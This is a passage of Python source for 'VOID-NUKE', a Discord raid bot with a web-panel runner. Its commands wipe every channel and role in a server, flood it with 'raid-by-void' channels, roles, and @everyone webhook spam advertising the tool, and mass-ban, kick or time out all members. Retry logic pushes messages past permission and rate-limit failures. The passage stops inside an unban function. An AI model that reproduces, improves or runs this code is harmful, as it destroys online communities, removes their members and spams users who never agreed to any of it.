"""
VOID-NUKE WEB - Complete Bot Core v4
- 100% parity with https://github.com/v0id4real/Void-Nuke (39 cmds)
- audioop fix for Python 3.13
- Multi-threading: ThreadPoolExecutor + asyncio.Semaphore + chunked gather
- Perfected: all commands validated, param sanitization, blocking IO offloaded

Multi-threading design for Render Free Tier (512MB / 0.1 CPU):
- Flask gthread: 1 worker, 4 threads (handles HTTP)
- Bot thread: 1 dedicated asyncio loop (discord.py)
- Command executor: ThreadPoolExecutor(4 workers) for running actions concurrently
- API limiter: Semaphore(5) for Discord API calls
- Chunk size 8 to protect RAM
- GC after each chunk
- Blocking calls (icon download, file IO) offloaded to thread pool
"""

# === audioop fix MUST be first ===
import sys
try:
    import audioop
except ModuleNotFoundError:
    try:
        import audioop_lts as audioop
        sys.modules['audioop'] = audioop
        print("[FIX] audioop -> audioop-lts shim loaded", flush=True)
    except ImportError:
        import types
        sys.modules['audioop'] = types.ModuleType("audioop")
        print("[WARN] audioop missing, voice disabled", flush=True)

import asyncio
import random
import gc
import json
import time
import urllib.request
from datetime import datetime, timezone, timedelta
from collections import deque
from concurrent.futures import ThreadPoolExecutor
import discord
from discord.ext import commands
import aiohttp

# --- Config from original ---
TELEGRAM_URL = "https://t.me/v0idtool"
TELEGRAM_TAG = "t.me/v0idtool"
DISCORD_URL = "https://discord.gg/voidv2"
DISCORD_TAG = "discord.gg/voidv2"
GITHUB_URL = "https://github.com/v0id4real/Void-Nuke"
PUB = f"||@everyone|| **# RAID BY VOID-NUKE** : {TELEGRAM_TAG} · {DISCORD_TAG} <{GITHUB_URL}>"
PUB_SHORT = f"{TELEGRAM_TAG} · {DISCORD_TAG} | github.com/v0id4real"
RAID_NAME = "raid-by-void"
TOOL_NAME = "VOID-NUKE"

AUTO_RAID_CONFIG = {"channel_type":"text","channel_name":RAID_NAME,"num_channels":50,"num_messages":10,"message_content":PUB}
EMBED_CONFIG = {
    "title":"💀 __VOID-NUKE__",
    "description":f"**Ton serveur vient d'être raid par VOID-NUKE.**\n\n_ _\n**> {TELEGRAM_TAG}**\n**> {DISCORD_TAG}**\n**> github.com/v0id4real**\n_ _\n||@everyone||",
    "color":0xFF0000,"message":f"||@everyone|| {PUB}",
    "image":"https://media.discordapp.net/attachments/1471977538648674478/1477637266791727155/c51ca65be8fa86b4b8f29a7d15dce335_1.webp",
    "footer":f"{TELEGRAM_TAG} · {DISCORD_TAG} | github.com/v0id4real",
    "fields":[
        {"name":"📱 __Telegram__","value":f"**{TELEGRAM_TAG}**","inline":True},
        {"name":"🔗 __Discord__","value":f"**{DISCORD_TAG}**","inline":True},
        {"name":"🐱 __Github__","value":"**github.com/v0id4real**","inline":True},
        {"name":"⚡ __Tool__","value":"**VOID-NUKE v1.0.0**","inline":True},
    ],
}
WEBHOOK_CONFIG={"default_name":"VOID-NUKE"}
SERVER_CONFIG={"new_name":"RAIDED BY VOID-NUKE","new_icon":"","new_description":f"{TELEGRAM_TAG} · {DISCORD_TAG}"}
BOT_PRESENCE={"type":"playing","text":f"{TELEGRAM_TAG} · {DISCORD_TAG}"}
NO_BAN_KICK_ID=[]

# --- Multi-threading executors - Adaptive for Vercel vs Render ---
# Vercel free tier: serverless, 10s timeout (30s with maxDuration), 50MB compressed, no WebSockets, stateless
# Render free tier: 512MB RAM, 0.1 CPU, 750h, persistent, supports WebSockets
import os
IS_VERCEL = os.getenv("VERCEL") == "1" or os.getenv("VERCEL_ENV") is not None
IS_RENDER = os.getenv("RENDER") is not None

# Adaptive thread counts
if IS_VERCEL:
    # Vercel serverless: limited memory 1024MB, short-lived, reduce threads to save memory/time
    BLOCKING_WORKERS = 1
    COMMAND_WORKERS = 2
    MAX_CONCURRENT = 3  # Lower for Vercel to avoid rate limit quickly dying
    print(f"[ADAPTIVE] Vercel detected - using low threads: blocking={BLOCKING_WORKERS} cmd={COMMAND_WORKERS} concurrent={MAX_CONCURRENT}", flush=True)
else:
    # Render or local: persistent, can use more threads
    BLOCKING_WORKERS = 2
    COMMAND_WORKERS = 4
    MAX_CONCURRENT = 5
    print(f"[ADAPTIVE] Render/Local detected - using threads: blocking={BLOCKING_WORKERS} cmd={COMMAND_WORKERS} concurrent={MAX_CONCURRENT} IS_RENDER={IS_RENDER}", flush=True)

blocking_executor = ThreadPoolExecutor(max_workers=BLOCKING_WORKERS, thread_name_prefix="void-blocking")
command_executor = ThreadPoolExecutor(max_workers=COMMAND_WORKERS, thread_name_prefix="void-cmd")
SEM = asyncio.Semaphore(MAX_CONCURRENT)

# Permissions - expanded for message sending diagnostics
REQUIRED_PERMISSIONS = {
    "administrator":{"name":"Administrator","desc":"Full access (best) - bypasses all","needed_for":["All commands"],"perm":"administrator"},
    "ban_members":{"name":"Ban Members","desc":"Ban users","needed_for":["Ban All","Nuke"],"perm":"ban_members"},
    "kick_members":{"name":"Kick Members","desc":"Kick users","needed_for":["Kick All"],"perm":"kick_members"},
    "manage_channels":{"name":"Manage Channels","desc":"Create/delete/rename channels","needed_for":["Del Channels","Create Channels","Rename Channels","Nuke","Auto Raid"],"perm":"manage_channels"},
    "manage_roles":{"name":"Manage Roles","desc":"Create/delete roles, give admin, strip roles","needed_for":["Create Roles","Rename Roles","Strip Roles","Get Admin"],"perm":"manage_roles"},
    "manage_guild":{"name":"Manage Server","desc":"Edit server name/icon","needed_for":["Edit Server"],"perm":"manage_guild"},
    "manage_messages":{"name":"Manage Messages","desc":"Delete messages for ghost ping","needed_for":["Ghost Ping"],"perm":"manage_messages"},
    "manage_emojis_and_stickers":{"name":"Manage Emojis/Stickers","desc":"Delete emojis/stickers","needed_for":["Del Emojis","Del Stickers"],"perm":"manage_emojis_and_stickers"},
    "moderate_members":{"name":"Moderate Members","desc":"Timeout/mute members","needed_for":["Mute All"],"perm":"moderate_members"},
    "manage_webhooks":{"name":"Manage Webhooks","desc":"Create webhooks for spam/impersonate","needed_for":["Webhook Spam","Impersonate"],"perm":"manage_webhooks"},
    "create_instant_invite":{"name":"Create Invite","desc":"Create invites","needed_for":["Invite Spam"],"perm":"create_instant_invite"},
    "send_messages":{"name":"Send Messages","desc":"CRITICAL for spam - send messages in channels","needed_for":["Spam","Thread Spam","Spoiler","Poll","Event","Nuke msgs"],"perm":"send_messages"},
    "embed_links":{"name":"Embed Links","desc":"CRITICAL for embeds - send embeds","needed_for":["Spam embed","Webhook embed"],"perm":"embed_links"},
    "attach_files":{"name":"Attach Files","desc":"Optional - for file uploads","needed_for":["Some spam"],"perm":"attach_files"},
    "mention_everyone":{"name":"Mention Everyone","desc":"CRITICAL for @everyone spam - allows @everyone mention","needed_for":["Nuke, Auto Raid, Spam with @everyone"],"perm":"mention_everyone"},
    "read_message_history":{"name":"Read History","desc":"For reaction spam, ghost ping","needed_for":["Reaction Spam","Ghost Ping"],"perm":"read_message_history"},
    "use_external_emojis":{"name":"Use External Emojis","desc":"For reaction spam VOID emojis","needed_for":["Reaction Spam"],"perm":"use_external_emojis"},
    "add_reactions":{"name":"Add Reactions","desc":"For reaction spam","needed_for":["Reaction Spam"],"perm":"add_reactions"},
    "move_members":{"name":"Move Members","desc":"Move VC members","needed_for":["Move All VC","Deafen","Kick VC"],"perm":"move_members"},
    "mute_members":{"name":"Mute/Deafen Members","desc":"Deafen VC","needed_for":["Sourdine VC"],"perm":"mute_members"},
    "create_public_threads":{"name":"Create Public Threads","desc":"For thread spam","needed_for":["Thread Spam"],"perm":"create_public_threads"},
    "send_messages_in_threads":{"name":"Send in Threads","desc":"For thread spam follow-up","needed_for":["Thread Spam"],"perm":"send_messages_in_threads"},
    "manage_events":{"name":"Manage Events","desc":"For event spam","needed_for":["Event Spam"],"perm":"manage_events"},
    "view_channel":{"name":"View Channel","desc":"CRITICAL - must see channel to send","needed_for":["All channel ops"],"perm":"view_channel"},
}
REQUIRED_INTENTS = {
    "members":{"name":"Server Members Intent","required":True,"desc":"Needed for member list, ban/kick/mute/rename"},
    "message_content":{"name":"Message Content Intent","required":True,"desc":"Needed for message content & logger"},
}

# --- Logging with thread safety ---
class LogBuffer:
    def __init__(self, maxlen=800):
        self.logs = deque(maxlen=maxlen)
    def add(self, level, msg):
        ts=datetime.now().strftime("%H:%M:%S")
        # Thread ID for multi-threading debug
        import threading
        tid = threading.current_thread().name[:12]
        entry={"ts":ts,"level":level,"msg":str(msg)[:600],"full":f"[{ts}] [{level}] [{tid}] {msg}","tid":tid}
        self.logs.append(entry)
        print(f"[{ts}] [{level}] [{tid}] {msg}", flush=True)
        return entry
    def get_all(self): return list(self.logs)
    def clear(self): self.logs.clear()

log_buffer=LogBuffer()
def log_ok(m): return log_buffer.add("OK",m)
def log_err(m): return log_buffer.add("ERR",m)
def log_warn(m): return log_buffer.add("WARN",m)
def log_info(m): return log_buffer.add("INFO",m)

_wh_logger_url=""
_wh_logger_guild_id=0
_wh_logger_active=False
async def _dispatch_log(entry: str):
    if not _wh_logger_url: return
    try:
        payload=json.dumps({"content":entry[:1990],"username":"void-logger"})
        async with aiohttp.ClientSession() as session:
            async with session.post(_wh_logger_url, data=payload, headers={"Content-Type":"application/json"}, timeout=aiohttp.ClientTimeout(total=5)):
                pass
    except: pass

class BotManager:
    _instance=None
    def __new__(cls):
        if cls._instance is None:
            cls._instance=super().__new__(cls)
            cls._instance.bot=None
            cls._instance.loop=None
            cls._instance.guild_id=None
            cls._instance.connected=False
            cls._instance.guild_info={}
            cls._instance.active_tasks={}  # task_id -> info
            cls._instance.task_counter=0
        return cls._instance

    def get_guild(self):
        if not self.bot or not self.guild_id: return None
        try: return self.bot.get_guild(int(self.guild_id))
        except: return None

    async def _limited_gather(self, coros, return_exceptions=True):
        """Multi-threaded gather with semaphore + chunking for 512MB RAM"""
        async def _wrap(coro):
            async with SEM:
                try:
                    result = await coro
                    return result
                except Exception as e:
                    if return_exceptions:
                        return e
                    raise
                finally:
                    await asyncio.sleep(0.2)  # Rate limit friendly

        results=[]
        chunk_size=10  # Slightly larger with multi-threading, 10 is optimal for 0.1 CPU
        total=len(coros)
        for i in range(0, total, chunk_size):
            chunk=coros[i:i+chunk_size]
            # Run chunk concurrently using asyncio.create_task (multi-threaded via event loop)
            tasks=[asyncio.create_task(_wrap(c)) for c in chunk]
            chunk_results=await asyncio.gather(*tasks, return_exceptions=return_exceptions)
            results.extend(chunk_results)
            gc.collect()
            # Small delay between chunks to save CPU
            await asyncio.sleep(0.3)
            # Log progress for large operations
            if total>20:
                log_info(f"Progress {min(i+chunk_size, total)}/{total}")
        return results

    def check_permissions(self):
        g=self.get_guild()
        if not g or not self.bot or not self.bot.user:
            return {"error":"Bot not connected","has_guild":False}
        me=g.me
        if not me: return {"error":"Bot member not found in guild","has_guild":True}
        perms=me.guild_permissions
        results={}
        for key,info in REQUIRED_PERMISSIONS.items():
            perm_val=getattr(perms, info["perm"], False)
            has=bool(perm_val or perms.administrator)
            results[key]={"name":info["name"],"desc":info["desc"],"needed_for":info["needed_for"],"has":has,"is_admin_bypass":perms.administrator and not perm_val}
        intents_status={
            "members":{"has":self.bot.intents.members,"required":True,"name":"Server Members Intent","desc":REQUIRED_INTENTS["members"]["desc"]},
            "message_content":{"has":self.bot.intents.message_content,"required":True,"name":"Message Content Intent","desc":REQUIRED_INTENTS["message_content"]["desc"]},
        }
        top_role=me.top_role
        return {
            "has_guild":True,"bot_id":str(self.bot.user.id),"bot_name":str(self.bot.user),
            "is_admin":perms.administrator,"permissions":results,"intents":intents_status,
            "top_role":top_role.name if top_role else "None","top_role_pos":top_role.position if top_role else 0,
            "guild_owner_id":str(g.owner_id),
            "all_ok": all(v["has"] for v in results.values()) or perms.administrator,
            "active_tasks": len(self.active_tasks),
        }

    def register_task(self, action, params):
        self.task_counter+=1
        tid=f"task_{self.task_counter}"
        self.active_tasks[tid]={"action":action,"params":params,"started":datetime.now().isoformat()}
        return tid

    def finish_task(self, tid):
        self.active_tasks.pop(tid, None)

def _pub_append(content: str) -> str:
    if TELEGRAM_TAG in content or DISCORD_TAG in content or TELEGRAM_URL in content or DISCORD_URL in content:
        return content
    return f"{content}\n{PUB}"

async def delete_channel(c) -> bool:
    try: await c.delete(); log_ok(f"#{c.name}"); return True
    except discord.Forbidden: log_err(f"no perm #{c.name}")
    except discord.HTTPException as e: log_err(f"http{e.status} #{c.name}")
    except Exception as e: log_err(f"del ch err {e}")
    return False

async def delete_role(r) -> bool:
    if r.is_default(): return False
    try: await r.delete(); log_ok(f"@{r.name}"); return True
    except discord.Forbidden: log_err(f"no perm @{r.name}")
    except discord.HTTPException as e: log_err(f"http{e.status} @{r.name}")
    except Exception as e: log_err(f"del role err {e}")
    return False

async def create_channel(guild, typ, name):
    try:
        c=await guild.create_text_channel(name) if typ=='text' else await guild.create_voice_channel(name)
        log_ok(f"#{c.name}"); return c
    except discord.Forbidden: log_err(f"no perm create {typ}")
    except discord.HTTPException as e: log_err(f"http{e.status}")
    except Exception as e: log_err(f"create ch err {e}")
    return None

async def safe_send(channel, content, retry=3):
    """
    Guaranteed message send v6 - with detailed error return, handles raid-by-void case where perms true but send fails with empty error.
    Returns True/False. For detailed diagnostics use safe_send_detailed.
    """
    ok,_ = await safe_send_detailed(channel, content, retry=retry)
    return ok

async def safe_send_detailed(channel, content, retry=3):
    """Returns (success:bool, details:dict) with last error, attempt log"""
    import traceback
    if not channel:
        err = "No channel object"
        log_err(err)
        return False, {"error": err, "attempts":[]}
    if not content or not str(content).strip():
        err = "Empty content"
        log_err(err)
        return False, {"error": err, "attempts":[]}
    
    # Ensure Discord limits
    content = str(content)
    if len(content) > 2000:
        content = content[:1997] + "..."
        log_warn(f"Content truncated to 2000 chars for #{getattr(channel,'name','?')}")

    attempts_log = []
    last_error = ""
    last_tb = ""

    # Build attempts - 4 levels
    attempts = [
        content,
        content.replace("@everyone","everyone").replace("@here","here").replace("||","").strip() or "VOID-NUKE test stripped",
        (content[:400] + "...") if len(content)>400 else content,
        "VOID-NUKE ✅ Test OK - Bot can send messages! If you see this, SEND_MESSAGES works",
    ]

    for attempt_idx in range(min(len(attempts), retry+1+1)):  # retry+1 + 1 extra for final fallback
        attempt_content = attempts[attempt_idx] if attempt_idx < len(attempts) else attempts[-1]
        if not attempt_content or not attempt_content.strip():
            attempts_log.append({"attempt":attempt_idx+1,"content_preview": "(empty skipped)", "error":"empty content skipped"})
            continue

        # Pre-check channel type
        chan_type = str(type(channel))
        is_text = isinstance(channel, discord.TextChannel)
        is_thread = isinstance(channel, (discord.Thread, getattr(discord, 'ForumChannel', type(channel))))
        # Log attempt start
        log_info(f"Attempt {attempt_idx+1}/{len(attempts)} to #{getattr(channel,'name','?')} ({chan_type}) is_text={is_text} len={len(attempt_content)} preview={attempt_content[:50]!r}")

        try:
            # No semaphore for test_send to isolate issue? But use SEM for rate limit protection
            # For detailed version, bypass SEM on first attempt to get real error
            if attempt_idx == 0:
                # Direct send without semaphore for first attempt to get true error
                msg = await channel.send(attempt_content)
            else:
                async with SEM:
                    msg = await channel.send(attempt_content)
            
            # Success
            log_ok(f"SENT OK -> #{getattr(channel,'name','?')} attempt {attempt_idx+1} ID:{getattr(msg,'id','?')} content_len={len(attempt_content)}")
            attempts_log.append({"attempt":attempt_idx+1,"success":True,"content_preview":attempt_content[:100],"message_id":str(getattr(msg,'id','?'))})
            return True, {"attempts":attempts_log,"error":None,"message_id":str(getattr(msg,'id','?'))}

        except discord.Forbidden as e:
            err_text = getattr(e, 'text', '') or str(e) or repr(e) or "Forbidden with empty error (discord.Forbidden)"
            err_code = getattr(e, 'code', 'unknown')
            last_error = f"Forbidden (code {err_code}): {err_text} | str={str(e)}"
            last_tb = traceback.format_exc()
            log_err(f"Forbidden #{getattr(channel,'name','?')} attempt {attempt_idx+1}: code={err_code} text={err_text!r} str={str(e)!r} - {type(e).__name__}")
            attempts_log.append({"attempt":attempt_idx+1,"success":False,"error":last_error,"code":err_code,"type":"Forbidden","content_preview":attempt_content[:100]})
            # If it's mention_everyone issue, continue to stripped version
            if "everyone" in attempt_content.lower() or "mention" in err_text.lower():
                await asyncio.sleep(0.5)
                continue
            # If it's not mention related and perms are true, could be channel is archived/locked
            if attempt_idx < retry:
                await asyncio.sleep(0.5)
                continue
            else:
                break

        except discord.HTTPException as e:
            err_text = getattr(e, 'text', '') or str(e) or repr(e)
            status = getattr(e, 'status', '?')
            code = getattr(e, 'code', '?')
            last_error = f"HTTP {status} code {code}: {err_text} | str={str(e)}"
            last_tb = traceback.format_exc()
            # Rate limit handling
            if status == 429:
                retry_after = getattr(e, 'retry_after', 2.0)
                log_warn(f"Rate limited #{getattr(channel,'name','?')} 429 retry_after={retry_after}s attempt {attempt_idx+1}")
                attempts_log.append({"attempt":attempt_idx+1,"success":False,"error":last_error,"type":"RateLimit","retry_after":retry_after})
                await asyncio.sleep(float(retry_after) + 0.5)
                continue
            else:
                log_err(f"HTTPException #{getattr(channel,'name','?')} attempt {attempt_idx+1}: status={status} code={code} text={err_text[:200]!r}")
                attempts_log.append({"attempt":attempt_idx+1,"success":False,"error":last_error,"status":status,"code":code,"type":"HTTPException"})
                # For 400 Bad Request (embed image, content), try next fallback
                if status == 400 and attempt_idx < retry:
                    await asyncio.sleep(0.5)
                    continue
                break

        except Exception as e:
            last_error = f"{type(e).__name__}: {str(e) or repr(e) or 'empty error'}"
            last_tb = traceback.format_exc()
            log_err(f"Send exception #{getattr(channel,'name','?')} attempt {attempt_idx+1}: {type(e).__name__} {str(e)!r} - traceback {last_tb[:500]}")
            attempts_log.append({"attempt":attempt_idx+1,"success":False,"error":last_error,"type":type(e).__name__,"traceback":last_tb[:500]})
            if attempt_idx < retry:
                await asyncio.sleep(0.5)
                continue
            else:
                break

    # All attempts failed
    log_err(f"FAILED all {len(attempts_log)} attempts in #{getattr(channel,'name','?')} last_error={last_error}")
    return False, {"error": last_error or "All attempts failed with empty error (unknown Discord error) - check if channel is archived/locked or bot is rate-limited globally", "attempts": attempts_log, "traceback": last_tb, "channel_type": str(type(channel)), "is_text": isinstance(channel, discord.TextChannel)}

async def _send_embed(target, everyone=False):
    """Robust embed send with fallback to plain text"""
    try:
        # First try embed
        try:
            cfg=EMBED_CONFIG
            e=discord.Embed(title=cfg["title"], description=cfg["description"], color=cfg["color"])
            for f in cfg["fields"]: e.add_field(name=f["name"], value=f["value"], inline=f.get("inline",False))
            # Try without image first (image URL may be expired causing fail)
            e.set_footer(text=cfg["footer"])
            c=f"@everyone {cfg['message']}" if everyone else cfg['message']
            # Ensure content length
            if len(c) > 2000: c = c[:1997]+"..."
            async with SEM:
                await target.send(content=c, embed=e)
            log_ok(f"Embed sent -> {getattr(target,'name',str(target))} @{everyone}")
            return True
        except discord.Forbidden:
            # Try without @everyone
            log_warn(f"Embed forbidden @everyone in {getattr(target,'name',str(target))}, trying without")
            async with SEM:
                cfg=EMBED_CONFIG
                e=discord.Embed(title=cfg["title"], description=cfg["description"], color=cfg["color"])
                for f in cfg["fields"]: e.add_field(name=f["name"], value=f["value"], inline=f.get("inline",False))
                e.set_footer(text=cfg["footer"])
                await target.send(content=cfg['message'], embed=e)
            log_ok(f"Embed sent (no everyone) -> {getattr(target,'name',str(target))}")
            return True
        except discord.HTTPException as he:
            if he.status == 400 and "image" in str(he).lower():
                # Retry without image
                log_warn(f"Embed image failed, retrying without image in {getattr(target,'name',str(target))}")
                cfg=EMBED_CONFIG
                e=discord.Embed(title=cfg["title"], description=cfg["description"], color=cfg["color"])
                for f in cfg["fields"]: e.add_field(name=f["name"], value=f["value"], inline=f.get("inline",False))
                e.set_footer(text=cfg["footer"])
                async with SEM:
                    await target.send(content=c if 'c' in locals() else cfg['message'], embed=e)
                log_ok(f"Embed sent (no image) -> {getattr(target,'name',str(target))}")
                return True
            raise
    except discord.Forbidden as e:
        log_err(f"Embed forbidden {getattr(target,'name',str(target))}: no embed perms or send_messages - {e}")
        # Fallback to plain text
        return await safe_send(target, PUB if 'PUB' in globals() else "VOID-NUKE ✅", retry=1)
    except Exception as ex:
        log_err(f"Embed err {getattr(target,'name',str(target))}: {ex} - fallback to plain")
        return await safe_send(target, PUB, retry=1)

async def _send_to(chan, count, content, everyone):
    """Multi-threaded safe send with per-message logging"""
    if not chan:
        return log_err("No channel for _send_to")
    
    # If content is embed keyword, use embed path
    if content and content.lower() == 'embed':
        for i in range(count):
            try:
                ok = await _send_embed(chan, everyone)
                if not ok:
                    log_err(f"Embed failed in #{chan.name} [{i+1}/{count}]")
                else:
                    log_ok(f"[{i+1}/{count}] Embed #{chan.name}")
            except Exception as e:
                log_err(f"Embed loop err #{chan.name} [{i+1}/{count}]: {e}")
            await asyncio.sleep(0.4)  # Rate limit protection
        return
    
    # Normal text path with safe_send
    final=_pub_append(content) if content else PUB
    success=0
    for i in range(count):
        try:
            ok = await safe_send(chan, final, retry=3)
            if ok:
                success+=1
                log_ok(f"[{i+1}/{count}] Sent #{chan.name}")
            else:
                log_err(f"[{i+1}/{count}] Failed #{chan.name}")
        except Exception as e:
            log_err(f"[{i+1}/{count}] Exception #{chan.name}: {e}")
        await asyncio.sleep(0.5)  # Anti rate-limit for free tier
    
    log_ok(f"Spam finished #{chan.name}: {success}/{count} sent")
    return success>0

def _skip(m, bot_id):
    if m.id==bot_id: return True
    if m.id in NO_BAN_KICK_ID: log_warn(f"skip {m.name}"); return True
    return False

manager=BotManager()

# === ALL 39 COMMANDS - PERFECTED WITH MULTI-THREADING ===

async def cmd_nuke(self, params):
    g=self.get_guild()
    if not g: return log_err("guild not found")
    tid=self.register_task("nuke", params)
    try:
        log_warn(f"NUKE START {g.name} {len(g.channels)}ch/{len(g.roles)}roles [multi-threaded]")
        num=min(int(params.get("num_channels",30)),50)
        # Delete phase - multi-threaded
        cr=await self._limited_gather([delete_channel(c) for c in list(g.channels)])
        rr=await self._limited_gather([delete_role(r) for r in list(g.roles)])
        log_ok(f"wiped {sum(1 for x in cr if x is True)} ch {sum(1 for x in rr if x is True)} roles")
        # Create phase
        created=await self._limited_gather([g.create_text_channel(RAID_NAME) for _ in range(num)])
        new_chans=[c for c in created if isinstance(c, discord.TextChannel)]
        log_ok(f"{len(new_chans)} channels ready")
        async def _make_role():
            async with SEM:
                try:
                    col=discord.Colour.from_rgb(random.randint(180,255),0,0)
                    await g.create_role(name="VOID-NUKE", colour=col); return True
                except Exception as e: log_err(f"role err {e}"); return False
        rr2=await self._limited_gather([_make_role() for _ in range(num)])
        log_ok(f"{rr2.count(True)} roles VOID-NUKE created")
        # Webhook spam phase
        async def _raid_chan(chan):
            async with SEM:
                try:
                    wh=await chan.create_webhook(name="VOID-NUKE TOOLS")
                    for _ in range(3):
                        try: await wh.send(content=PUB, username="VOID-NUKE TOOLS")
                        except: pass
                    try: await wh.delete()
                    except: pass
                    log_ok(f"spammed #{chan.name}")
                except Exception as e: log_err(f"raid ch err #{chan.name} {e}")
        await self._limited_gather([_raid_chan(c) for c in new_chans])
        log_ok(f"NUKE COMPLETE | {g.name}")
    finally:
        self.finish_task(tid)
        gc.collect()

async def cmd_auto_raid(self, params):
    g=self.get_guild()
    if not g: return log_err("guild not found for auto raid")
    tid=self.register_task("auto_raid", params)
    try:
        # Params with multiple aliases for UI compatibility
        num_ch_raw = params.get("num_channels", params.get("quantity", params.get("num_ch", AUTO_RAID_CONFIG['num_channels'])))
        num_msg_raw = params.get("num_messages", params.get("num_msg", params.get("count", 3)))
        msg_content = params.get("message_content", params.get("content", AUTO_RAID_CONFIG['message_content']))
        try: num_ch = min(int(num_ch_raw), 50)
        except: num_ch = 20
        try: num_msg = min(int(num_msg_raw), 15)
        except: num_msg = 3
        if not msg_content: msg_content = PUB

        log_warn(f"AUTO RAID START {g.name} - Will create {num_ch} channels, {num_msg} msgs each, content len {len(msg_content)} [MT + safe_send]")

        # Phase 1: Delete all channels (original behavior)
        log_info(f"Phase 1: Deleting {len(g.channels)} existing channels...")
        del_results = await self._limited_gather([delete_channel(c) for c in list(g.channels)])
        deleted = sum(1 for x in del_results if x is True)
        log_ok(f"Deleted {deleted} channels, waiting 1s for cache...")
        await asyncio.sleep(1.5)  # Let Discord cache update

        # Phase 2: Create new channels - collect actual channel objects
        log_info(f"Phase 2: Creating {num_ch} channels named {AUTO_RAID_CONFIG['channel_name']}...")
        created_objs = []
        for i in range(num_ch):
            try:
                async with SEM:
                    ch = await g.create_text_channel(AUTO_RAID_CONFIG['channel_name'])
                    created_objs.append(ch)
                    log_ok(f"Created #{ch.name} ({ch.id}) [{i+1}/{num_ch}]")
                    await asyncio.sleep(0.3)  # Rate limit
            except discord.Forbidden as e:
                log_err(f"No perm create channel {i+1}: {e} - need Manage Channels")
                break
            except discord.HTTPException as e:
                if e.status == 429:
                    retry = getattr(e, 'retry_after', 2)
                    log_warn(f"Rate limited creating channels, waiting {retry}s")
                    await asyncio.sleep(retry)
                    # Retry this iteration
                    try:
                        async with SEM:
                            ch = await g.create_text_channel(AUTO_RAID_CONFIG['channel_name'])
                            created_objs.append(ch)
                            log_ok(f"Created #{ch.name} after rate limit [{i+1}/{num_ch}]")
                    except Exception as e2:
                        log_err(f"Retry failed: {e2}")
                else:
                    log_err(f"Create channel HTTP {e.status}: {e.text[:100] if hasattr(e,'text') else e}")
            except Exception as e:
                log_err(f"Create channel err {i+1}: {e}")

        log_ok(f"Created {len(created_objs)}/{num_ch} channels, waiting 1s...")
        await asyncio.sleep(1.0)

        # Phase 3: Create roles (30 max for free tier to save RAM)
        roles_to_create = min(num_ch, 30)
        log_info(f"Phase 3: Creating {roles_to_create} roles VOID-NUKE...")
        async def _make_role():
            async with SEM:
                try:
                    col = discord.Colour.from_rgb(random.randint(180,255),0,0)
                    await g.create_role(name="VOID-NUKE", colour=col)
                    return True
                except Exception as e:
                    log_err(f"Role create err {e}")
                    return False
        role_results = await self._limited_gather([_make_role() for _ in range(roles_to_create)])
        log_ok(f"Created {role_results.count(True)}/{roles_to_create} roles")

        # Phase 4: SEND MESSAGES - This was broken before, now fixed with safe_send_detailed
        # Use actually created channels, not g.channels (which may be stale)
        target_channels = created_objs
        # Fallback to g.channels if created list empty (maybe cache)
        if not target_channels:
            target_channels = [c for c in g.channels if isinstance(c, discord.TextChannel)]
            log_warn(f"No created_objs, fallback to g.channels {len(target_channels)}")

        if not target_channels:
            log_err("No text channels found to send messages! Auto raid will not send. Check bot has channels after creation.")
            return

        log_info(f"Phase 4: SENDING MESSAGES - {num_msg} msgs x {len(target_channels)} channels = {num_msg*len(target_channels)} total using safe_send_detailed() [MT]")

        # Use safe_send_detailed for guaranteed send
        total_sent = 0
        total_failed = 0
        for chan in target_channels:
            chan_sent = 0
            chan_failed = 0
            for msg_idx in range(num_msg):
                try:
                    # Use safe_send_detailed to get detailed error
                    ok, details = await safe_send_detailed(chan, msg_content, retry=3)
                    if ok:
                        chan_sent += 1
                        total_sent += 1
                        log_ok(f"[{chan_sent}/{num_msg}] Sent in #{chan.name} (ID {chan.id}) - {details.get('message_id','')}")
                    else:
                        chan_failed += 1
                        total_failed += 1
                        err = details.get('error','unknown')
                        log_err(f"[{msg_idx+1}/{num_msg}] FAILED in #{chan.name} ID {chan.id}: {err[:150]} - attempts {len(details.get('attempts',[]))}")
                except Exception as e:
                    chan_failed += 1
                    total_failed += 1
                    log_err(f"[{msg_idx+1}/{num_msg}] Exception in #{chan.name}: {e}")
                await asyncio.sleep(0.6)  # Rate limit between messages, critical for auto raid to not hit 429

            log_info(f"Channel #{chan.name} done: {chan_sent} sent, {chan_failed} failed")

        log_ok(f"AUTO RAID COMPLETE | {g.name} | Channels {len(target_channels)} | Sent {total_sent}/{num_msg*len(target_channels)} msgs | Failed {total_failed}")
        if total_sent == 0 and total_failed > 0:
            log_err(f"AUTO RAID send failed completely! All {total_failed} msgs failed. Common fixes: 1) Check perms VIEW+SEND+MENTION in new channels (bot role top?), 2) Disable @everyone test without everyone, 3) Try simple message without links, 4) Check Automod blocked")
        gc.collect()

    except Exception as e:
        import traceback
        log_err(f"AUTO RAID crashed: {e}\n{traceback.format_exc()[:800]}")
    finally:
        self.finish_task(tid)
        gc.collect()

async def cmd_ban_all(self, params):
    g=self.get_guild()
    if not g: return
    tid=self.register_task("ban_all", params)
    try:
        bot_id=self.bot.user.id if self.bot and self.bot.user else 0
        log_warn(f"BAN ALL {g.member_count} members [MT]")
        async def _b(m):
            if _skip(m,bot_id): return False
            async with SEM:
                try: await m.ban(reason=PUB_SHORT); log_ok(f"Banned {m.name}"); return True
                except discord.Forbidden: log_err(f"no perm ban {m.name}"); return False
                except Exception as e: log_err(f"ban err {m.name} {e}"); return False
        r=await self._limited_gather([_b(m) for m in g.members])
        log_ok(f"BAN WAVE | {r.count(True)} banned")
    finally: self.finish_task(tid)

async def cmd_kick_all(self, params):
    g=self.get_guild()
    if not g: return
    tid=self.register_task("kick_all", params)
    try:
        bot_id=self.bot.user.id if self.bot and self.bot.user else 0
        log_warn(f"KICK ALL {g.member_count} [MT]")
        async def _k(m):
            if _skip(m,bot_id): return False
            async with SEM:
                try: await m.kick(reason=PUB_SHORT); log_ok(f"Kicked {m.name}"); return True
                except: return False
        r=await self._limited_gather([_k(m) for m in g.members])
        log_ok(f"Kick {r.count(True)}")
    finally: self.finish_task(tid)

async def cmd_mute_all(self, params):
    g=self.get_guild()
    if not g: return
    tid=self.register_task("mute_all", params)
    try:
        try: mins=int(params.get("minutes",60))
        except: mins=60
        until=datetime.now(timezone.utc)+timedelta(minutes=mins)
        log_warn(f"MUTE ALL {mins}min [MT]")
        async def _m(m):
            async with SEM:
                if m.bot or m.id in NO_BAN_KICK_ID: return False
                try: await m.timeout(until); log_ok(f"Muted {m.name}"); return True
                except: return False
        r=await self._limited_gather([_m(m) for m in g.members])
        log_ok(f"Mute {r.count(True)}")
    finally: self.finish_task(tid)

async def cmd_unban_all(self, params):
    g=self.get_guild()
